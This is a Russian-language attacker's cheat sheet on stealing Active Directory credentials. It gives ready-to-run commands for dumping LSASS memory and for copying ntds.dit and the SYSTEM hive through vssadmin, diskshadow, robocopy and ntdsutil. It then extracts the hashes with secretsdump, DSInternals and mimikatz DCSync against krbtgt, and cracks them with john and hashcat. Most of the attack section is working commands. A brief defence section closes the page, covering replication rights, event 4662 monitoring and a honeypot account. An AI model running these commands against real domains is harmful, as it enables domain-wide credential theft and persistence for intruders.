#windows #AD #attacks 

> Атака на Контроллер домена, вызванная механизмом **репликации** в Windows

### Должна быть либо привилегия админа, либо привилегия на репликацию

# Цель

# ntds.dit 

(_**N**ew **T**echnologies **D**irectory **S**ervices . **D**irectory **I**nformation **T**ree_)
`C:\Windows\NTDS\ntds.dit`

Но файл всегда занят системно
Его всегда использует системный процесс `lsass.exe`
! НО

Его копия всегда доступна

---

## ДАМП процесса LSASS.exe

### 1) **Procdump (от Sysinternals)
Утилита от Microsoft, которой часто доверяют антивирусы.

```powershell
procdump.exe -ma lsass.exe lsass.dmp
```

### 2) **Comsvcs.dll** 
Использование системной библиотеки для создания дампа (очень скрытно):

```powershell
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID_LSASS> C:\temp\lsass.dmp full
```

---

## Tools

### 1) vssadmin (lolbin)

Cоздание теневой копии диска _C:\. Это позволяет «восстанавливать» предыдущие версии файла (штатная утилита для своего рода бэкапа), в том числе и копию ntds.dit

```powershell
vssadmin create shadow /for=c:
```

копируем саму базу и куст реестра SYSTEM Так как там лежат ключи шифрования
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

### 2) diskshadow (lolbin)

Также создает теневую копию диска

```cmd
diskshadow.exe

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent nowriters
begin backup
add volume c: alias ntdss
create
expose %cdrive% E:
end backup
exit
```

### 3) NTDSUtil (Самый «легитимный» способ)

`ntdsutil.exe` — это мощная встроенная утилита для обслуживания базы данных Active Directory. У неё есть функция **IFM (Install From Media)**. Она создана для того, чтобы делать бэкап базы, везти его на флешке в филиал с плохим интернетом и там разворачивать новый контроллер домена.

```powershell
ntdsutil.exe "ac i ntds" "ifm" "create full c:\temp\dump" q q
```

#### Расшифровка NTDS.dit

linux
```bash
impacket-secretsdump -security <pathto>/SECURITY -system <pathto>/SYSTEM -ntds <pathto>/ntds.dit local
# or
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

windows
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### 4) Robocopy (lolbin)

> Встроенная утилита robocopy также может использоваться для копирования файлов в режиме резервного копирования. Robocopy — это инструмент репликации каталогов из командной строки

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

### 5) Mimikatz/secretsdump

Получаем необходимые данные для проведения атаки `Golden Ticket`
```mimikatz
lsadump::dcsync /user:<blabla>\krbtgt
```

```mimikatz
lsadump::dcsync /all /csv
```
``

```powershell
secretsdump.py -system <путь до файла SYSTEM (стащили с теневой копии Z:\Windows\System32\config\SYSTEM)> -ntds <путь до файла NTDS.DIT> LOCAL
```

```bash
python3 secretsdump.py -outputfile domain_hashes corp.local/user_name:'password'@192.168.1.10
```

## Использование полученных хэшей

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt.ntds
```

```bash
hashcat -m 1000 hashes.txt.ntds /usr/share/wordlists/rockyou.txt -O -w 3 -o cracked.txt
```


# Защита

1) Отключение прав
- Replicating Directory Changes  
- Replicating Directory Changes All  
- Replicating Directory Changes In Filtered Set

2) Мониторинг события 4662

3) Использоваие группы Protected Users

4) Создание DCSync Honeypot
Создайте фиктивную учетную запись с очень заманчивым именем (например, `svc_domain_sync`) и выдайте ей права на репликацию.

- **Суть:** Настройте немедленный алерт в SIEM на любое использование этой учетки или любое обращение к ней. Поскольку легитимно она ничего не реплицирует, любое событие с ней — признак того, что злоумышленник нашел её через `PowerView` или `BloodHound` и пытается использовать.